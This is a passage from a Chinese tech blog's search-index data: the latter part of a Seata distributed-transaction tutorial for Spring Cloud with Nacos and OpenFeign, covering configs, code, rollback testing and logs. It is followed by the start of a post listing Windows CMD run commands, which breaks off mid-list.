OpenFeign 去调用库存服务和账户服务的接口 1234567891011121314151617181920212223242526@Servicepublic class OrderServiceImpl implements OrderService { @Resource private OrderMapper orderMapper; @Resource private AccountClient accountClient; @Resource private StorageClient storageClient; @Override @GlobalTransactional(name = "create-order", rollbackFor = Exception.class) public CommonResult createOrder(Order order) { // 创建订单 orderMapper.create(order); // 扣减商品库存 storageClient.decrease(order.getProductId(), order.getCount()); // 扣减账户余额 accountClient.decrease(order.getUserId(), order.getMoney()); //更新订单状态 orderMapper.update(order.getId(), OrderStatus.FINISHED.getValue()); return new CommonResult(); }} 5.5、创建主启动类123456789@SpringBootApplication(exclude = DataSourceAutoConfiguration.class)@EnableDiscoveryClient@EnableFeignClientspublic class OrderApplication { public static void main(String[] args) { SpringApplication.run(OrderApplication.class, args); }} 6、创建库存工程6.1、创建 pom.xml ★库存工程的 Maven 配置★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;parent&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-transaction-demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;!--seata-common-api--&gt; &lt;dependency&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-common-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;!--nacos config--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--nacos discovery--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;!-- 阿里巴巴已经集成服务间调用X-id的传递，包括FeignClient的重写，如果在之前自定义封装过Feign，注意两者之间的冲突--&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;!--去除默认依赖的版本--&gt; &lt;exclusion&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- 指定Seata的版本，需要与Seata服务端的版本保持一致--&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${seata.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 6.2、创建 bootstrap.yml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061nacos: # Nacos的地址 server-addr: 127.0.0.1:8848 # Nacos的命名空间 namespace:ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d # Nacos的配置分组 group: seata_demo # Seata Server的配置 seata: application: seata-server tx-service-group: seata-storage-service-tx-group####### 以上是自定义配置中心和注册中心的共同属性，方便其他地方直接引用 #######server: port: 2000spring: application: name: seata-storage-service cloud: nacos: discovery: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/seata_storage?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false username: root password: 123456mybatis: mapperLocations: classpath*:mapper/*.xml type-aliases-package: com.seata.study.domainseata: enabled: true application-id: ${spring.application.name} tx-service-group: ${nacos.seata.tx-service-group} enable-auto-data-source-proxy: false registry: type: nacos nacos: application: ${nacos.seata.application} server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: "" config: type: filefeign: hystrix: enabled: falselogging: level: io: seata: info 6.3、注入代理数据源 ★代理数据源注入代码★ 123456789101112131415161718192021222324252627282930@Configurationpublic class DataSourceProxyConfig { @Value("${mybatis.mapperLocations}") private String mapperLocations; @Value("${mybatis.type-aliases-package}") private String typeAliasesPackage; @Bean @ConfigurationProperties(prefix = "spring.datasource") public DataSource dataSource() { return new DruidDataSource(); } @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) { return new DataSourceProxy(dataSource); } @Bean public SqlSessionFactory sqlSessionFactory(DataSourceProxy dataSourceProxy) throws Exception { SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTypeAliasesPackage(typeAliasesPackage); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); }} 6.4、创建业务处理类123456789101112131415161718192021222324252627@Servicepublic class StorageServiceImpl implements StorageService { @Resource private StorageMapper storageMapper; @Override public CommonResult decrease(Long productId, Long count) { Storage storage = storageMapper.findByProduct(productId); Long total = storage.getTotal(); Long used = storage.getUsed(); Long residue = storage.getResidue(); // 校验参数 if (count == null || count &lt;= 0) { return new CommonResult(SystemCode.ERROR_PARAMETER); } // 判断库存是否足够 if (count &gt; residue) { return new CommonResult(SystemCode.STORAGE_NOT_ENOUGH); } // 扣减库存 storage.setUsed(used + count); storage.setResidue(residue - count); storageMapper.update(storage); return new CommonResult(); }} 6.5、创建启动主类123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class StorageApplication { public static void main(String[] args) { SpringApplication.run(StorageApplication.class, args); }} 7、创建账户工程7.1、创建 pom.xml ★账户工程的 Maven 配置★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;parent&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-transaction-demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;!--seata-common-api--&gt; &lt;dependency&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-common-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;!--nacos config--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--nacos discovery--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;!-- 阿里巴巴已经集成服务间调用X-id的传递，包括FeignClient的重写，如果在之前自定义封装过Feign，注意两者之间的冲突--&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;!--去除默认依赖的版本--&gt; &lt;exclusion&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- 指定Seata的版本，需要与Seata服务端的版本保持一致--&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${seata.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 7.2、创建 bootstrap.yml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061nacos: # Nacos的地址 server-addr: 127.0.0.1:8848 # Nacos的命名空间 namespace:ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d # Nacos的配置分组 group: seata_demo # Seata Server的配置 seata: application: seata-server tx-service-group: seata-account-service-tx-group####### 以上是自定义配置中心和注册中心的共同属性，方便其他地方直接引用 #######server: port: 2002spring: application: name: seata-account-service cloud: nacos: discovery: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/seata_account?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false username: root password: 123456mybatis: mapperLocations: classpath*:mapper/*.xml type-aliases-package: com.seata.study.domainseata: enabled: true application-id: ${spring.application.name} tx-service-group: ${nacos.seata.tx-service-group} enable-auto-data-source-proxy: false registry: type: nacos nacos: application: ${nacos.seata.application} server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: "" config: type: filefeign: hystrix: enabled: falselogging: level: io: seata: info 7.3、注入代理数据源 ★代理数据源注入代码★ 123456789101112131415161718192021222324252627282930@Configurationpublic class DataSourceProxyConfig { @Value("${mybatis.mapperLocations}") private String mapperLocations; @Value("${mybatis.type-aliases-package}") private String typeAliasesPackage; @Bean @ConfigurationProperties(prefix = "spring.datasource") public DataSource dataSource() { return new DruidDataSource(); } @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) { return new DataSourceProxy(dataSource); } @Bean public SqlSessionFactory sqlSessionFactory(DataSourceProxy dataSourceProxy) throws Exception { SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTypeAliasesPackage(typeAliasesPackage); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); }} 7.4、创建业务处理类这里添加了模拟账户业务处理超时的代码，延时时间为 10 秒。因为 OpenFeign 的默认超时时间为 1 秒，所以当订单服务远程调用账户服务来扣减账户余额时，会抛出请求超时的异常，这时就可以测试全局事务注解 @GlobalTransactional 是否生效了。若 @GlobalTransactional 生效，当订单服务的远程调用抛出请求超时的异常后，账户数据库里对应的账户余额不会被修改；若账户余额被修改了，则说明 @GlobalTransactional 没有生效。 12345678910111213141516171819202122232425262728293031323334@Servicepublic class AccountServiceImpl implements AccountService { @Resource private AccountMapper accountMapper; @Override public CommonResult decrease(Long userId, BigDecimal money) { Account account = accountMapper.findByUser(userId); BigDecimal total = account.getTotal(); BigDecimal used = account.getUsed(); BigDecimal residue = account.getResidue(); // 模拟业务处理超时 try { Thread.sleep(10000); } catch (InterruptedException e) { e.printStackTrace(); } // 校验参数 if (money == null || money.compareTo(BigDecimal.ZERO) &lt; 1) { return new CommonResult(SystemCode.ERROR_PARAMETER); } // 判断余额是否足够 if (money.compareTo(residue) == 1) { return new CommonResult(SystemCode.ACCOUNT_NOT_ENOUGH); } // // 扣减余额 account.setUsed(account.getUsed().add(money)); account.setResidue(account.getResidue().subtract(money)); accountMapper.update(account); return new CommonResult(); }} 7.5、创建主启动类123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class AccountApplication { public static void main(String[] args) { SpringApplication.run(AccountApplication.class, args); }} 8、测试项目代码 1）首先启动 MySQL Server、Nacos Server、Seata Server，并按照上文介绍的准备工作进行初始化 2）分别启动 seata-account-service、seata-storage-service、seata-order-service 服务 3）浏览器访问 http://127.0.0.1:8848/nacos 打开 Nacos 的控制台，各服务成功启动后，在 Nacos 的控制台里可以看到有多个服务已注册（如下图） 4）观察不同数据库中的 seata_account.t_account、seata_storage.t_storage 业务表的数据，如下图： 5）浏览器访问 http://127.0.0.1:2001/order/create?userId=1&amp;count=3&amp;money=20&amp;productId=1 调用订单创建接口，由于订单服务远程调用账户服务来扣减账户余额时，抛出了请求超时的异常，因此响应的 500 错误页面显示如下： 6）再观察不同数据库中的 seata_account.t_account、seata_storage.t_storage 业务表的数据是否发生了变更，若数据没有变更，则说明全局事务注解 @GlobalTransactional 生效了，否则注解没有生效 7）创建订单的接口被调用后，可以看到三个应用在控制台输出的日志如下： ★各微服务的日志信息★ 123456789101112################## seata_order 服务的日志 #####################java.net.SocketTimeoutException: Read timed out at java.base/java.net.SocketInputStream.socketRead0(Native Method) ~[na:na] at java.base/java.net.SocketInputStream.socketRead(SocketInputStream.java:115) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:168) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:140) ~[na:na] at java.base/java.io.BufferedInputStream.fill(BufferedInputStream.java:252) ~[na:na] at java.base/java.io.BufferedInputStream.read1(BufferedInputStream.java:292) ~[na:na] at java.base/java.io.BufferedInputStream.read(BufferedInputStream.java:351) ~[na:na] at java.base/sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:746) ~[na:na] at java.base/sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:689) ~[na:na] 123456################## seata_storage 服务的日志 #####################[_RMROLE_1_2_144] i.s.c.r.p.c.RmBranchRollbackProcessor : rm handle branch rollback process:xid=192.168.1.130:8091:86489181212647424,branchId=86489188837892097,branchType=AT,resourceId=jdbc:mysql://127.0.0.1:3306/seata_storage,applicationData=null[_RMROLE_1_2_144] io.seata.rm.AbstractRMHandler : Branch Rollbacking: 192.168.1.130:8091:86489181212647424 86489188837892097 jdbc:mysql://127.0.0.1:3306/seata_storage[_RMROLE_1_2_144] i.s.r.d.undo.AbstractUndoLogManager : xid 192.168.1.130:8091:86489181212647424 branch 86489188837892097, undo_log deleted with GlobalFinished[_RMROLE_1_2_144] io.seata.rm.AbstractRMHandler : Branch Rollbacked result: PhaseTwo_Rollbacked 1234567891011################## seata_account 服务的日志 #####################io.seata.core.exception.RmTransactionException: Response[ TransactionException[Could not found global transaction xid = 192.168.1.130:8091:86489181212647424, may be has finished.] ] at io.seata.rm.AbstractResourceManager.branchRegister(AbstractResourceManager.java:69) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.DefaultResourceManager.branchRegister(DefaultResourceManager.java:96) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.register(ConnectionProxy.java:241) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.processGlobalTransactionCommit(ConnectionProxy.java:219) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.doCommit(ConnectionProxy.java:199) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.lambda$commit$0(ConnectionProxy.java:184) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy$LockRetryPolicy.execute(ConnectionProxy.java:292) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.commit(ConnectionProxy.java:183) ~[seata-all-1.4.0.jar:1.4.0] 9、Seata Server 整合 Nacos 配置中心在上面的案例中，并没有使用 Nacos 配置中心来存储 TC（Seata Server）相关的配置信息，而是直接使用了 file.conf ，但在生产环境中一般极少采用这种方式。特别注意，当使用 Seata Server 使用 Nacos 作为配置中心后，Seata Server 启动时只需要依赖 registry.conf，即不再需要 file.conf。同时在 Spring Cloud 应用中不再需要依赖任何 file.conf、registry.conf，直接在 bootstrap.yml 里就可以完成 Seata 的所有配置。 9.1、配置 Seata Server 的 registry.conf在 Seata Server 的 registry.conf 里，指定使用配置中心来存储 TC 的相关配置（如下） 12345678910111213141516171819202122232425registry { type = "nacos" nacos { application = "seata-server" serverAddr = "127.0.0.1:8848" group = "seata_demo" namespace = "ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d" cluster = "default" username = "" password = "" }}config { type = "nacos" nacos { serverAddr = "127.0.0.1:8848" namespace = "ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d" group = "seata_demo" username = "" password = "" }} 9.2、导入配置信息到 Nacos 配置中心Seata 官方提供了将配置信息（file.conf）批量导入到各种主流配置中心的 Shell 脚本，存放路径是在 Seata 源码目录下的 script/config-center 目录（如下） 1234567891011121314script/config-center├── apollo│&nbsp;&nbsp; └── apollo-config.sh├── config.txt├── consul│&nbsp;&nbsp; └── consul-config.sh├── etcd3│&nbsp;&nbsp; └── etcd3-config.sh├── nacos│&nbsp;&nbsp; ├── nacos-config.py│&nbsp;&nbsp; └── nacos-config.sh├── README.md└── zk └── zk-config.sh 其中 config.txt 为通用参数文件，包含了 Seata Server（TC）需要的所有配置信息，需要根据实际情况更改文件里的以下内容： 1234567891011service.vgroupMapping.seata-order-service-tx-group=defaultservice.vgroupMapping.seata-storage-service-tx-group=defaultservice.vgroupMapping.seata-account-service-tx-group=defaultstore.mode=dbstore.db.datasource=druidstore.db.dbType=mysqlstore.db.driverClassName=com.mysql.cj.jdbc.Driverstore.db.url=jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=falsestore.db.user=rootstore.db.password=123456 通用参数文件 config.txt 更改完成后，执行对应的 Shell 脚本将配置信息写入到配置中心即可。值得一提的是，config.txt 文件必须在 xxxx.sh 的上级目录里，而且 Shell 脚本可以重复执行多次。若使用 Nacos 作为配置中心，执行脚本时可以指定一些启动参数，如 Nacos 的 IP、端口号、命名空间、配置组等，Shell 脚本的具体使用方法可以查看官方说明文档 12# 执行数据导入脚本$ sh nacos-config.sh -h 127.0.0.1 -p 8848 -t ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d -g seata_demo 成功批量导入配置信息到 Nacos 后，控制台会输出如下提示： 1234========================================================================= Complete initialization parameters, total-count:79 , failure-count:0========================================================================= Init nacos config finished, please start seata-server. 访问 Nacos 的控制台，可以看到已经有对应的配置信息（如下）： 9.3、配置 Spring Cloud 项目以订单模块为例，bootstrap.yml 的完整配置如下，此时订单模块的 src/main/resources 目录下不再需要存放 file.conf、registry.conf 配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475nacos: # Nacos的地址 server-addr: 127.0.0.1:8848 # Nacos的命名空间 namespace: ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d # Nacos的配置分组 group: seata_demo # Seata Server的配置 seata: application: seata-server tx-service-group: seata-order-service-tx-group####### 以上是自定义配置中心和注册中心的共同属性，方便其他地方直接引用 #######server: port: 2001spring: application: name: seata-order-service cloud: nacos: discovery: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} config: server-addr: ${nacos.server-addr} prefix: ${spring.application.name} file-extension: yaml namespace: ${nacos.namespace} group: ${nacos.group} # 以下配置内容均可以添加在Nacos配置中心 datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/seata_order?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false username: root password: 123456mybatis: mapperLocations: classpath*:mapper/*.xml type-aliases-package: com.seata.study.domainseata: enabled: true application-id: ${spring.application.name} tx-service-group: ${nacos.seata.tx-service-group} enable-auto-data-source-proxy: false registry: type: nacos nacos: application: ${nacos.seata.application} server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: "" config: type: nacos nacos: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: ""feign: hystrix: enabled: falselogging: level: io: seata: info 9.4、代码下载（配置中心版） 点击下载完整的案例代码（配置中心版） 10、参考资料 Spring Cloud 快速集成 Seata 下篇 - Seata 入门教程（中级篇） Seata 入门教程 - 中级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务 分布式"},{title:"CMD 命令大全",url:"/posts/49651ebe.html",text:'1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071. appwiz.cpl：程序和功能 2. calc：启动计算器 5. chkdsk.exe：磁盘检查6. cleanmgr: 打开磁盘清理工具 9. cmd.exe：CMD命令提示符 10. 自动关机命令 Shutdown -s -t 600：表示600秒后自动关机 shutdown -a ：可取消定时关机 Shutdown -r -t 600：表示600秒后自动重启 12. CompMgmtLauncher：计算机管理 13. compmgmt.msc：计算机管理 14. credwiz：备份或还原储存的用户名和密码 16. control：控制面版 17. dcomcnfg：打开系统组件服务 19. devmgmt.msc：设备管理器 20. desk.cpl：屏幕分辨率 21. dfrgui：优化驱动器22. dialer：电话拨号程序 23. diskmgmt.msc：磁盘管理 24. dvdplay：DVD播放器 25. dxdiag：检查DirectX信息 26. eudcedit：造字程序 27. eventvwr：事件查看器 28. explorer：打开资源管理器 29. Firewall.cpl：Windows防火墙 31. fsmgmt.msc：共享文件夹管理器 32. gpedit.msc：组策略 33. hdwwiz.cpl：设备管理器 34. inetcpl.cpl：Internet属性 35. intl.cpl：区域 36. iexpress：木马捆绑工具37. joy.cpl：游戏控制器 38. logoff：注销命令 39. lusrmgr.msc：本地用户和组 40. lpksetup：语言包安装/删除向导41. lusrmgr.msc：本机用户和组 42. main.cpl：鼠标属性 43. mmsys.cpl：声音 45. mem.exe：显示内存使用情况47. mmc：打开控制台 48. mobsync：同步命令 50. msconfig.exe：系统配置实用程序 51. msdt：微软支持诊断工具 52. msinfo32：系统信息 53. mspaint：画图 54. Msra：Windows远程协助 55. mstsc：远程桌面连接 56. NAPCLCFG.MSC：客户端配置 57. ncpa.cpl：网络连接 58. narrator：屏幕“讲述人” 59. Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项 60. netstat : an(TC)命令检查接口 61. notepad：打开记事本 62. Nslookup：IP地址侦测器 63. odbcad32：ODBC数据源管理器 64. OptionalFeatures：打开“打开或关闭Windows功能”对话框 65. osk：打开屏幕键盘 66. perfmon.msc：计算机性能监测器 67. perfmon：计算机性能监测器 68. PowerShell：提供强大远程处理能力 69. printmanagement.msc：打印管理 70. powercfg.cpl：电源选项 71. psr：问题步骤记录器 72. Rasphone：网络连接 73. Recdisc：创建系统修复光盘 74. Resmon：资源监视器 75. Rstrui：系统还原 76. regedit.exe：注册表 77. regedt32：注册表编辑器 78. rsop.msc：组策略结果集 79. sdclt：备份状态与配置，就是查看系统是否已备份 80. secpol.msc：本地安全策略 81. services.msc：本地服务设置 82. sfc /scannow：扫描错误并复原/windows文件保护 83. sfc.exe：系统文件检查器 84. shrpubw：创建共享文件夹 85. sigverif：文件签名验证程序 86. slui：Windows激活，查看系统激活信息 87. slmgr.vbs -dlv ：显示详细的许可证信息 slmgr.vbs -dli ：显示许可证信息 slmgr.vbs -xpr ：当前许可证截止日期 slmgr.vbs -dti ：显示安装ID 以进行脱机激 slmgr.vbs -ipk ：(Product Key)安装产品密钥 slmgr.vbs -ato ：激活Windows slmgr.vbs -cpky ：从注册表中清除产品密钥（防止泄露引起的攻击） slmgr.vbs -ilc ：(License file)安装许可证 slmgr.vbs -upk ：卸载产品密钥 slmgr.vbs -skms ：(name[ort] )批量授权 88. snippingtool：截图工具，支持无规则截图 89. soundrecorder：录音机，没有录音时间的限制 90. StikyNot：便笺 91. sysdm.cpl：系统属性 92. sysedit：系统配置编辑器 93. syskey：系统加密，一旦加密就不能解开，保护系统的双重密码 94. taskmgr：任务管理器（旧版） 96. taskschd.msc：任务计划程序 97. timedate.cpl：日期和时间 99. utilman：辅助工具管理器 100. wf.msc：高级安全Windows防火墙 101. WFS：Windows传真和扫描 102. wiaacmgr：扫描仪和照相机向导 103. winver：关于Windows 104. wmimgmt.msc：打开windows管理体系结构(WMI) 105. write：写字板106. wscui.cpl：操作中心 107. wscript：windows脚本宿主设置 108. wuapp：Windows更新 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991. gpedit.msc：组策略2. sndrec32：录音机3. Nslookup：IP地址侦测器4. explorer：打开资源管理器 5. logoff：注销命令6. shutdown：60秒倒计时关机命令7. lusrmgr.msc：本机用户和组8. services.msc：本地服务设置9. oobe/msoobe /a：检查XP是否激活10. notepad：打开记事本 11. cleanmgr：垃圾整理12. net start messenger：开始信使服务13. compmgmt.msc：计算机管理14. net stop messenger：停止信使服务15. conf：启动netmeeting16. dvdplay：DVD播放器17. charmap：启动字符映射表18. diskmgmt.msc：磁盘管理实用程序19. calc：启动计算器20. dfrg.msc：磁盘碎片整理程序21. chkdsk.exe：Chkdsk磁盘检查22. devmgmt.msc：设备管理器 24. drwtsn32：系统医生25. rononce -p：15秒关机26. dxdiag：检查DirectX信息27. regedt32：注册表编辑器 29. rsop.msc：组策略结果集30. mem.exe：显示内存使用情况31. regedit.exe：注册表32. winchat：XP自带局域网聊天33. progman：程序管理器34. winmsd：系统信息35. perfmon.msc：计算机性能监测程序36. winver：检查Windows版本37. sfc /scannow：扫描错误并复原38. taskmgr：任务管理器39. winver：检查Windows版本40. wmimgmt.msc：打开windows管理体系结构(WMI)41. wupdmgr：windows更新程序42. wscript：windows脚本宿主设置43. write：写字板44. winmsd：系统信息45. wiaacmgr：扫描仪和照相机向导46. winchat：XP自带局域网聊天47. mem.exe：显示内存使用情况48. msconfig.exe：系统配置实用程序49. mplayer2：简易widnows media player50. mspaint：画图板51. mstsc：远程桌面连接52. mplayer2：媒体播放机53. magnify：放大镜实用程序54. mmc：打开控制台55. mobsync：同步命令56. dxdiag：检查DirectX信息57. iexpress：木马捆绑工具58. fsmgmt.msc：共享文件夹管理器59. utilman：辅助工具管理器60. diskmgmt.msc：磁盘管理实用程序61. dcomcnfg：打开系统组件服务62. ddeshare：打开DDE共享设置110. osk：打开屏幕键盘 111. odbcad32：ODBC数据源管理器112. oobe/msoobe /a：检查XP是否激活114. logoff：注销命令66. notepad：打开记事本67. nslookup：网络管理的工具向导68. ntbackup：系统备份和还原69. narrator：屏幕“讲述人”70. ntmsmgr.msc：移动存储管理器71. ntmsoprq.msc：移动存储管理员操作请求72. netstat -an：(TC)命令检查接口73. syncapp：创建一个公文包74. sysedit：系统配置编辑器75. sigverif：文件签名验证程序76. ciadv.msc：索引服务程序77. shrpubw：创建共享文件夹78. secpol.msc：本地安全策略79. syskey：系统加密，一旦加密就不能解开，保护windows xp系统的双重密码80. services.msc：本地服务设置81. Sndvol32：音量控制程序82. sfc.exe：系统文件检查器83. sfc /scannow：windows文件保护84. ciadv.msc：索引服务程序85. tourstart：xp简介（安装完成后出现的漫游xp程序）86. taskmgr：任务管理器87. eventvwr：事件查看器88. eudcedit：造字程序89. 